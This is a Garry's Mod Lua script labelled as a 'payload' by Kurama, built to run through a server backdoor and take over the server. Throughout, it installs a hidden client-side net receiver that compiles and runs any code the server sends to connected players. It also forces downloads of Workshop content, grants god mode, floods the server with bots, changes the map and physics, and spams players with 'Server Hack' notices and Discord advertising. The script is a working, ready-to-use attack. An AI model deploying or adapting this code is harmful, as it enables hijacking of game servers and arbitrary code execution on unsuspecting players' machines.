-- Payload Created by Kurama

-- Visuel Bloom Water

-- Obligation to credit myself in the visual

-- discord.gg/kurama

function RandomString(intMin, intMax)
local ret = ""
    for _ = 1, math.random(intMin, intMax) do
    ret = ret .. string.char(math.random(65, 90))
end
    return ret
end
local randomtable = {
    CodeRandom = RandomString(0, 69),
    TimingRandom = RandomString(0, 69),
    ClientRandom = RandomString(0, 69),
    ServeurRadom = RandomString(0, 69)
    }
util.AddNetworkString(randomtable["TimingRandom"])
util.AddNetworkString(randomtable["CodeRandom"])
BroadcastLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "Spawn", function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
        ply:SendLua([[steamworks.DownloadUGC(YOUR_ID, function(n) game.MountGMA(n) game.AddParticles("particles/YOUR_PCF.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
    end
end)

local function InfoClient(code)
local data = util.Compress(code)
local len = #data
    net.Start(randomtable["CodeRandom"])
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
-- Download
for k, v in pairs(player.GetAll()) do
    v:SendLua("steamworks.FileInfo(1518736064,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
    v:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
end

-- Change Server
timer.Simple(2.5, function()
    RunConsoleCommand("hostname", "Server Event by  Kurama -) discord.gg/kurama")
    RunConsoleCommand("ulx", "god", "*")
    RunConsoleCommand("sv_alltalk", "1")
        for k, v in pairs(player.GetAll()) do
    v:SendLua([[RunConsoleCommand("gmod_language", "ko")]])
end
    PrecacheParticleSystem("CHANGE_ME")
end)

-- Custom Settings Server
timer.Create("PlayerName", 5, 99, function()
    for _, v in pairs(player.GetAll()) do
        v:GodEnable()
        v:setDarkRPVar("rpname", "Event by Kurama -) Join Discord : discord.gg/kurama")
    end
end)

timer.Create("GM_Map", 220, 1, function()
    RunConsoleCommand("ulx", "map", "gm_construct")
end)

timer.Create("AddBot", 0.5, game.MaxPlayers() - player.GetCount(), function()
    RunConsoleCommand("bot")
end)

timer.Create("Speed", 5, 1, function()
    RunConsoleCommand("sv_friction", "-50")
    RunConsoleCommand("sv_gravity", "300")
end)

timer.Simple(5, function()
    for k, v in pairs(player.GetAll()) do
        v:SetRunSpeed(400 * 4)
        v:SetWalkSpeed(400 * 4)
    end
end)

-- Particle - 2
timer.Simple(5, function()
InfoClient([[net.Receive("]] .. randomtable["TimingRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
InfoClient([[
    for i = 1, 10 do
    ParticleEffectAttach("CHANGE_ME", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
end
]])
end)

-- Change Server
timer.Simple(5, function()
    InfoClient([[
timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "Server Hack by Kurama !", math.random(0, 4), 1.5 )
end)
timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "Server Hack by TheCedoux !", math.random(0, 4), 1.5 )
end)
timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "Server Backdoor is dead !", math.random(0, 4), 1.5 )
end)
timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "Sorry my Friends !", math.random(0, 4), 1.5 )
end)
timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "discord.gg/kurama", math.random(0, 4), 1.5 )
end)
]])
end)

-- SkyBox
timer.Simple(1, function()
InfoClient([[
    function GAMEMODE:PostDraw2DSkyBox()
local col = Color(255, 0, 0, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
    function GAMEMODE:PreDrawSkyBox()
local col = Color(255, 0, 0, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
        return !!1
    end
]])

-- Color Map
InfoClient([[
local black = {}
    hook.Add("HUDPaint", "]] .. RandomString(0, 69) .. [[",function()
        for k,v in pairs(black) do
        v()
    end
end)
black["CoolEffect"] = function()
local mats = Entity(0):GetMaterials()
    for k,v in pairs(mats) do
local ab = Color( 0, 0, 0 )
        Material(v):SetVector("$color", Vector(ab))
        Material(v):SetTexture( "$basetexture", "_rt_fullframefb" )
    end
end
]])

-- Zoom and Sound
InfoClient([[
local sW, sH = ScrW(), ScrH()
local w,h = ScrW(), ScrH()
local W, H = ScrW(), ScrH()
local prevVal = 2
local defaultfov = LocalPlayer():GetFOV()
local override = 70
local sent = false
local audio
local skys = ents.FindByClass("env_skypaint")
local function AudioVizualier()
    if not audio then return end
local tbl = {}
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local vv = Vector(col.r / 0, col.g / 0, col.b / 0)
    audio:FFT(tbl, FFT_4096)
local avg = 0
    for i = 1, 40 do
    avg = avg + tbl[i]
end
local h = CurTime() * 250 % 360
    prevVal = Lerp(30 * FrameTime(), prevVal, avg)
        if prevVal > 2 then
    util.ScreenShake(vector_origin, prevVal * 2, 10, 2, 5000)
local vPos = LocalPlayer():EyePos()
local emitter = ParticleEmitter( LocalPlayer():EyePos())
local particle = emitter:Add( "sprites/glow04_noz", vPos )
    if ( particle ) then
    particle:SetVelocity(VectorRand() * 50)
    particle:SetDieTime(1)
    particle:SetStartAlpha(0)
    particle:SetEndAlpha(0)
    particle:SetStartSize(50)
    particle:SetEndSize(0)
    particle:SetStartLength(55)
    particle:SetEndLength(0)
    particle:SetColor(vv)
    particle:SetGravity(Vector(0,0,0))
    particle:SetAirResistance(5)
    particle:SetCollide(true)
    particle:SetBounce(0.9)
end
    override = Lerp(10 * FrameTime(), override, prevVal * .875)
    else
    override = Lerp(5 * FrameTime(), override, defaultfov)
        sent = false
    end
end
sound.PlayURL("https://cdn.kurama.info/songs/Water.mp3", "noblock", function(s)
    if not IsValid(s) then return end
        audio = s
    s:SetVolume( 15 )
    s:EnableLooping( false )
end)
hook.Add("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[", AudioVizualier)
hook.Add("CalcView", "]] .. randomtable["ClientRandom"] .. [[", function(ply, origin, angles, fov, znear, zfar)
    return {
    ["origin"] = origin,
    ["angles"] = angles,
    ["fov"] = override,
    ["znear"] = znear,
    ["zfar"] = zfar
    }
end)
local function stop()
    audio = nil
    hook.Remove("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[")
    hook.Remove("HUDShouldDraw", "]] .. randomtable["ClientRandom"] .. [[")
    hook.Remove("CalcView", "]] .. randomtable["ClientRandom"] .. [[") 
    for k, v in pairs(oldhooks) do
    hook.Add("HUDPaint", k, v)
        oldhooks[k] = nil
    end
end
concommand.Add("lelstop", stop)
    if s == 1 then 
timer.Create("]] .. RandomString(0, 69) .. [[", 0.2, 0, function()
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)
end
]])
end)

-- Chat Spam
timer.Simple(5, function()
InfoClient([[  
timer.Create("]] .. randomtable["ServeurRadom"] .. [[", 1.5, 0, function()
local time = tonumber(0)
local Message = {
    "< https://discord.gg/kurama >",
    "<< https://discord.gg/kurama >>",
    "<<< https://discord.gg/kurama >>>",
    "<<<< https://discord.gg/kurama >>>>",
    "<<<<< https://discord.gg/kurama >>>>>",
    "<<<<<< https://discord.gg/kurama >>>>>>",
    "<<<<<<< https://discord.gg/kurama >>>>>>>",
    "<<<<<<<< https://discord.gg/kurama >>>>>>>>",
    "<<<<<<<<< https://discord.gg/kurama >>>>>>>>>",
    "<<<<<<<< https://discord.gg/kurama >>>>>>>>",
    "<<<<<<< https://discord.gg/kurama >>>>>>>",
    "<<<<<< https://discord.gg/kurama >>>>>>",
    "<<<<< https://discord.gg/kurama >>>>>",
    "<<<< https://discord.gg/kurama >>>>",
    "<<< https://discord.gg/kurama >>>",
    "<< https://discord.gg/kurama >>",
    }
    for _, line in pairs(Message) do
    time = time + tonumber(0.1)
timer.Simple(time,function()
        chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
        end)
    end
end)
]])
end)

-- Model Change
timer.Simple(5, function()
    for k, v in pairs(player.GetAll()) do
        v:SetModel("models/player/dewobedil/danganronpa/monokuma.mdl")
    end
end)

-- Model
timer.Simple(5, function()
InfoClient([[
timer.Create("]] .. RandomString(0, 69) .. [[",1,5800,function()
local kurama = ClientsideModel("models/player/dewobedil/danganronpa/monokuma.mdl")
    kurama:SetNoDraw(true)
    kurama:SetModelScale(50)
timer.Create("Model12", 0.01, 0, function()
    kurama:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
end)
local data = {}
local function genkurama(id)
local pos = LocalPlayer():GetPos()
    data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
end
    for i=1, 50 do
    genkurama(i)
end
    hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
local z = LocalPlayer():GetPos().z
    for i=1, #data do
        kurama:SetPos(data[i][1])
        kurama:SetupBones()
        kurama:DrawModel()
        data[i][1].z = data[i][1].z - data[i][2] / 20
        if data[i][1].z <= z then
        genkurama(i)
    end
end
    end)
end)
]])
end)

timer.Create("Prop", 5, 0, function()
    for k, v in pairs(ents.FindByClass("prop_*")) do
local phys = v:GetPhysicsObject()
    if (IsValid(phys)) then
    phys:EnableMotion(true)
    end
end
local props = ents.GetAll()
    for _, prop in ipairs(props) do
        if (prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
        end
    end
end)

timer.Create(RandomString(0, 69), 5.5, 1, function()
    for k, v in pairs(ents.FindByClass("prop_*")) do
local phys = v:GetPhysicsObject()
    if (IsValid(phys)) then
        phys:EnableMotion(true)
    end
end
local props = ents.GetAll()
    for _, prop in ipairs(props) do
        if (prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
        end
    end
end)
